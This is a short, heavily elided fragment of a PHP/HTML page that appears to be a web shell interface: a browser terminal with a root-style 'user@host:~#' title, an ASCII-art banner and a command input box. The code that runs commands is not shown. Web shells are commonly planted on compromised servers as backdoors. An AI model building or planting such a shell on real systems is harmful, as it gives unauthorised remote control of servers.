...
<?php
    ...
    <head>
        <meta charset="UTF-8" />
        <title>
            <?php echo get_current_user(); ?>@<?php echo gethostname(); ?>:~#
        </title>
     ...
     8.      .8  888         d8(  888   888       888 .  888   888  888    .o  888   888  888   888  888   888   888   888 <span></span>
      YooooooP  o888o        `Y888""8o d888b      "888" o888o o888o `Y8bod8P' o888o o888o `Y8bod8P'  `V88V"V8P' o888o o888o<span></span>
            ...
            <div id="shell-input">
                ...
                ?>" style="width:45px;height:45px;filter: drop-shadow(0 0 0.75rem white);"><label for="shell-cmd"
                    id="shell-prompt" class="shell-prompt">???</label>
